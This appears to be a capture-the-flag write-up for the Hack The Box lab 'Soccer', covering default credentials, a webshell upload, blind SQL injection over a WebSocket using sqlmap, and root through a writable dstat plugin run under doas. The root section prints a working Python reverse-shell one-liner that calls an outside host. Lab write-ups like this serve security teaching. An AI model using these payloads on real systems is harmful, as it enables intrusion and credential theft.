---
layout: post
title: "HTB: Soccer"
subtitle: "Tiny File Manager default creds to webshell, blind SQLi over a WebSocket for SSH creds, then doas dstat plugin to root"
date: 2023-02-02
tags: [htb, linux, default-creds, websocket-sqli, doas]
category: writeups
tldr: "Tiny File Manager 2.4.3 at /tiny had default admin creds, which let me upload a webshell for a www-data shell. A vhost soc-player.soccer.htb spoke to a WebSocket on 9091 that was blind-SQL-injectable, dumping player:PlayerOftheMatch2022 for SSH. Root came from a doas rule allowing dstat as root plus a writable plugin directory."
---

## the box

Soccer is a Linux box running nginx 1.18.0 on 80, SSH on 22, and an unknown service on 9091. The site is a static soccer page. After adding `soccer.htb` to my hosts file, the interesting path was elsewhere.

## recon

gobuster found `/tiny`, which served Tiny File Manager:

```
/tiny  (Status: 301)  [--> http://soccer.htb/tiny/]
```

The login footer named the version: Tiny File Manager 2.4.3. The default credentials still worked:

```
admin:admin@123
```

Port 9091 answered HTTP-ish but only with `Cannot GET /`, so it was not a normal web root yet.

## foothold

Tiny File Manager 2.4.3 has a documented shell-upload path: find a writable folder, upload a PHP file, browse to it. I uploaded a webshell into a writable directory and got execution as `www-data`.

From there I enumerated the host. `/etc/hosts` and the nginx config exposed a second vhost and its backend:

```
127.0.0.1  soccer  soccer.htb  soc-player.soccer.htb
```

```
server {
    server_name soc-player.soccer.htb;
    root /root/app/views;
    location / {
        proxy_pass http://localhost:3000;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
    }
}
```

## user

`soc-player.soccer.htb` let me sign up and log in. The `/check` page held client JS that opened a WebSocket to port 9091 and sent the ticket id as JSON:

```js
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
ws.send(JSON.stringify({ "id": msg }));
```

The `id` value was injectable, but the only signal back was whether the ticket existed, so this was blind SQLi over a WebSocket. I used a middleware that turns a normal HTTP query into a WebSocket message, so sqlmap can drive it. The relevant bits of the middleware:

```python
ws_server = "ws://soccer.htb:9091/"
data = '{"id":"%s"}' % message
```

Run the middleware, then point sqlmap at the local HTTP endpoint:

```bash
python3 sql.py
# [+] Send payloads in http://localhost:8081/?id=*
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -C username,password --dump
```

That dumped one account:

```
| username | password             |
| player   | PlayerOftheMatch2022 |
```

Those creds worked over SSH as `player`, who held the user flag.

## root

`sudo -l` had nothing, but there was a SUID `doas` binary at `/usr/local/bin/doas`. Its config lived in a non-default path:

```bash
find / -type f -iname "doas.conf" 2>/dev/null
# /usr/local/etc/doas.conf
```

```
permit nopass player as root cmd /usr/bin/dstat
```

dstat loads Python plugins named `dstat_*.py` from several directories, and one of them was writable:

```
/usr/local/share/dstat   (writable)
```

I dropped a reverse-shell plugin there:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",8484));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")
```

```bash
# place it as /usr/local/share/dstat/dstat_reverse.py, then:
doas -u root /usr/bin/dstat --reverse
```

dstat ran the plugin as root and the listener caught a root shell with the root flag.

## takeaway

Default credentials on an exposed file manager opened the whole box. The interesting part is the SQLi living behind a WebSocket instead of an HTTP parameter, solved by bridging WebSocket to HTTP so a standard tool could exploit it. Root is a doas rule plus a writable plugin path, the same pattern as a sudo binary that loads code from a directory you can write.
